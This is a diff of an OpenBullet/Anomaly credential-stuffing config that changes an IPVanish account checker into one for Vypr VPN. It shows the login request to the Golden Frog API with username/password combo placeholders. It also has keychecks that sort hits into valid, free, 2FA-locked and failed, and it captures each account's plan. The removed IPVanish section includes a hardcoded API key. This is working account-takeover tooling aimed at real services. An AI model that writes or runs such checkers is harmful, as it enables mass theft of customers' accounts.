@@ -1,9 +1,9 @@
 [SETTINGS]
 {
-  "Name": "IPVanish",
+  "Name": "Vypr VPN",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T16:20:07.453103+04:30",
+  "LastModified": "2020-09-04T16:20:48.0709487+04:30",
   "AdditionalInfo": "",
   "Author": "",
   "Version": "1.4.4 [Anomaly]",
@@ -50,28 +50,23 @@
 }
 
 [SCRIPT]
-FUNCTION GenerateGUID -> VAR "uuid" 
+#Post REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
 
-REQUEST POST "https://account.ipvanish.com/api/v3/login" 
-  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52178b52178\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"<uuid>\"}" 
-  CONTENTTYPE "application/json" 
-  HEADER "X-Client: ipvanish" 
-  HEADER "X-Client-Version: 1.2." 
-  HEADER "X-Platform: Android" 
-  HEADER "X-Platform-Version: 22" 
-  HEADER "Host: account.ipvanish.com" 
-  HEADER "Connection: Keep-Alive" 
-  HEADER "User-Agent: okhttp/3.12.0" 
-  HEADER "Accept-Encoding: gzip, deflate" 
-
-KEYCHECK 
-  KEYCHAIN Success OR 
-    KEY "email" 
-    KEY "access_token" 
+#Key_Check KEYCHECK 
   KEYCHAIN Failure OR 
-    KEY "The username or password provided is incorrect" 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "\"confirmed\": true," 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"vpn\": null" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"locked\"" 
 
-PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "expire" 
+#Plan PARSE "<SOURCE>" JSON "account_level_display" CreateEmpty=FALSE -> CAP "Plan" 
 
-#Expiry_Date FUNCTION UnixTimeToDate "<expire>" -> CAP "Expiry Date" 
+#Account_Type PARSE "<SOURCE>" JSON "account_level" CreateEmpty=FALSE -> CAP "Account Type" 
 
